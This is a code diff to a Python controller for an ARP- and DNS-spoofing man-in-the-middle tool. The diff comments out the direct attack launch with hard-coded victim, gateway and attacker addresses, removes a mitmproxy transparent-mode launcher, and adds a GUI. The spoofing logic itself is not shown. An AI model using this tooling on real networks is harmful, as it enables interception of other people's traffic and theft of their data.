@@ -3,6 +3,8 @@ from arp_spoof import ARPSpoofer
 from dns_spoof import DNSSpoofer
 from web_server import WEBServer
 from mitmproxy.tools.main import mitmdump
+from interface import App
+
 import sys
 
 class SpoofingController:
@@ -13,13 +15,7 @@ class SpoofingController:
 
     def start_attack(self):
         print("Starting ARP spoofing, DNS spoofing, and Web server...")
-        def start_mitmproxy():
-            sys.argv = [
-                "mitmdump",           # Run mitmdump
-                "-s", "proxy.py",  # Use your custom mitmproxy script
-                "--mode", "transparent"  # Transparent proxy mode
-            ]
-            mitmdump()
+       
 
         # Create threads for each task
         arp_thread = threading.Thread(target=self.arp_spoofer.spoof)
@@ -44,27 +40,29 @@ class SpoofingController:
 
 
 if __name__ == "__main__":
-    victim = {
-        'ip' : '192.168.1.74',
-        'mac' : "8:0:27:b4:97:59"
-    }
-    gtw = {
-        'ip' : '192.168.1.254',
-        'mac' : "80:ca:4b:ac:f3:3"
-    }
-    attacker = {
-        'ip' : '192.168.1.72',
-        'mac' : "ac:bc:32:91:0a:ad"
-    }
+    # victim = {
+    #     'ip' : '192.168.1.74',
+    #     'mac' : "8:0:27:b4:97:59"
+    # }
+    # gtw = {
+    #     'ip' : '192.168.1.254',
+    #     'mac' : "80:ca:4b:ac:f3:3"
+    # }
+    # attacker = {
+    #     'ip' : '192.168.1.72',
+    #     'mac' : "ac:bc:32:91:0a:ad"
+    # }
 
-    controller = SpoofingController(victim=victim, gtw=gtw, attacker=attacker)
+    # controller = SpoofingController(victim=victim, gtw=gtw, attacker=attacker)
 
-    # Define a function to run `mitmdump` with your custom script
+    # # Define a function to run `mitmdump` with your custom script
     
     
 
-    try:
-        controller.start_attack()
-    except KeyboardInterrupt:
-        controller.stop_attack()
-        print("\nAttack stopped.")
+    # try:
+    #     controller.start_attack()
+    # except KeyboardInterrupt:
+    #     controller.stop_attack()
+    #     print("\nAttack stopped.")
+    app = App()
+    app.mainloop()
